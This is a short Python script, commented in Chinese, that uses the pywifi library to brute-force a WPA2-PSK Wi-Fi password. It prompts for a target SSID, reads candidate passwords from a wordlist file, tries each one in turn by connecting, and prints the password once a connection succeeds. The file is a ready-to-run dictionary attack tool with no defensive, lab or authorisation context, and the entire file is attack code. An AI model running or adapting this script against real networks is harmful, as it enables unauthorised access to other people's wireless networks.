#coding:utf8
	
import pywifi
from pywifi import *
import time

wifi = PyWiFi() #创建一个无线对象
ifaces = wifi.interfaces()[0] #取第一个无线网卡

ifaces.scan() #扫描
results = ifaces.scan_results()

class wifi_cracker():
  def __init__(self,ssid,pwd_file):
    self.ssid = ssid
    self.wifi = pywifi.PyWiFi() #抓取无线网卡
    self.iface = wifi.interfaces()[0] #抓取第一个无线网卡
    self.pwd_list = self.readPwdFile(pwd_file)

  def readPwdFile(self,pwd_file):
    pwd_list = []
    with open(pwd_file,'r',encoding='utf8') as pwd_file:
      for line in pwd_file:
        pwd_list.append(line.replace("\n",""))
    return pwd_list

  def crack(self):
    profile = Profile() #配置文件
    profile.ssid = self.ssid
    profile.auth = const.AUTH_ALG_OPEN #需要密码
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #加密类型
    profile.cipher = const.CIPHER_TYPE_CCMP #加密单元

    for pwd in self.pwd_list:
      profile.key = pwd
      self.iface.remove_all_network_profiles() #移除其它配置文件
      tmp_profile = self.iface.add_network_profile(profile) #加载配置文件
      self.iface.connect(tmp_profile) #连接wifi
      print("[-] Cracking...")
      time.sleep(2)

      if ifaces.status() == const.IFACE_CONNECTED:
        print('[*] Crack success!')
        print('[*] password is '+pwd)
        return True

    print('[*] Crack Failed')
    return False

if __name__ == "__main__":
  ssid = input("enter the wifi ssid=>")
  w = wifi_cracker(ssid=ssid,pwd_file='./pwd.txt')
  r = w.readPwdFile('./pwd.txt')
  w.crack()
